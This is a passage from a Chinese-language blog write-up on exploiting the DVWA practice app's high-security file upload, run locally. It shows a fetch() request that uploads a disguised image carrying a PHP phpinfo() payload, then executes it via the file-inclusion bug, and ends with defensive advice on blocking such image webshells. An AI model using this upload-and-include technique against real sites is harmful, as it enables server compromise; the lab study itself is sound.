+</span><span>    </span><span style=color:#b8bb26>"credentials"</span><span>: </span><span style=color:#b8bb26>"include"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"headers"</span><span>: {
+</span><span>        </span><span style=color:#b8bb26>"User-Agent"</span><span>: </span><span style=color:#b8bb26>"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept"</span><span>: </span><span style=color:#b8bb26>"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Accept-Language"</span><span>: </span><span style=color:#b8bb26>"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Content-Type"</span><span>: </span><span style=color:#b8bb26>"multipart/form-data; boundary=---------------------------257607891334311387353687588123"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Upgrade-Insecure-Requests"</span><span>: </span><span style=color:#b8bb26>"1"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Dest"</span><span>: </span><span style=color:#b8bb26>"document"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Mode"</span><span>: </span><span style=color:#b8bb26>"navigate"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-Site"</span><span>: </span><span style=color:#b8bb26>"same-origin"</span><span>,
+</span><span>        </span><span style=color:#b8bb26>"Sec-Fetch-User"</span><span>: </span><span style=color:#b8bb26>"?1"
+</span><span>    },
+</span><span>    </span><span style=color:#b8bb26>"referrer"</span><span>: </span><span style=color:#b8bb26>"http://localhost:8080/vulnerabilities/upload/"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"body"</span><span>: </span><span style=color:#b8bb26>"-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n100000\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"3.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n&lt;svg version=\"1.1\" id=\"Capa_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" width=\"400px\" height=\"738px\" viewBox=\"0 0 400 738\" enable-background=\"new 0 0 400 738\" xml:space=\"preserve\">&lt;/svg>&lt;?php phpinfo(); ?>\r\n-----------------------------257607891334311387353687588123\r\nContent-Disposition: form-data; name=\"Upload\"\r\n\r\nUpload\r\n-----------------------------257607891334311387353687588123--\r\n"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"method"</span><span>: </span><span style=color:#b8bb26>"POST"</span><span>,
+</span><span>    </span><span style=color:#b8bb26>"mode"</span><span>: </span><span style=color:#b8bb26>"cors"
+</span><span>});
+</span></code></pre><p>然后再提交，依然不行，淦。这次改成绝对正常的图片附带phpinfo。<p><img alt=image-20220426171159207 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220426171159207.webp><p>上传！失败而且发现一个警告：<pre style=color:#fdf4c1aa;background-color:#282828><code><span>Warning: getimagesize(): Filename cannot be empty in /var/www/html/vulnerabilities/upload/source/high.php on line 17
+</span></code></pre><p>调试 dvwa 代码后发现是 dvwa 代码里没检查错误，上传失败的原因是图片太大超过了表单限制=。=<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>( $uploaded_size &lt; 100000 ) && // 实际上 php 在 $_FILES[ 'uploaded' ][ 'size' ] 设置的是 0，error 是 2
+</span><span>        getimagesize( $uploaded_tmp )
+</span></code></pre><p>正确做法应该是先检查错误：<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>( $_FILES[ 'uploaded' ][ 'error' ] === 0) &&
+</span><span>( $uploaded_size &lt; 100000 ) &&
+</span><span>getimagesize( $uploaded_tmp )
+</span></code></pre><p>不然 <code>$uploaded_tmp</code> 始终是空字符串的情况下，只会提示 <code>filename cannot be empty</code> 就很不友好=。=我不确定这算不算 bug 但反正对我这样不太熟悉 php 的人不友好，强行 <code>echo var_dump($_FILES[ 'uploaded' ]);</code> 才发现有个 <code>error</code> 被设置成了 2。如果没有这个 <code>error</code> 的话我可能就要懵上几天了。<p>总之，发现问题原因之后，解决之。<p>把图片放tinypng压缩一下（160k => 6k），然后重新用正常图片带 payload，然后在文件包含这一节的漏洞包含这个png文件完成利用。<p><img alt=image-20220427113343344 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-05/image-20220427113343344.webp><p>完成。<h2 id=zong-jie>总结</h2><p>阻止上传的文件没有夹带私货基本不太可能，毕竟可以用各种乱七八糟的办法把代码隐藏起来，比如编码成像素。但阻止利用还是可以的，把文件包含的洞和文件名解析的洞堵上，传个图片马之类的就没什么用了。图片马应该也能通过搜索文件内容是否包含特定字节序列（比如<code>&lt;?php</code>）来堵一部分利用方式吧，虽然说有误杀的可能。<p>还有种做法是考虑不要把上传文件存到可能被当代码解析的地方，比如和代码一起放在 <code>/var/www/html</code>。可以考虑下部署个 Ceph 之类的对象存储服务或者买大厂的对象存储。这样的话解析漏洞大概率是用不了了，包含漏洞也只要堵上远程包含就行。相应的对象存储服务本身有没有洞，有没有按最佳实践做好保护都会变成新问题=。=这属于是扩大攻击面了。<p>不过编程习惯好的码农再加上一门合适的语言和技术选型，相对安全还是能有个大概的保障的吧，咱也不敢说死，毕竟菜，啥也不懂。但烂项目是真的可以很烂，之前玩弄过的一个 Android App 就非常山寨，居然秘钥都敢放客户端=。=这帮人到底怎么做的技术决策我是真的无法理解了。<p>好了，哔哔完了。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/dvwa>/DVWA/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>
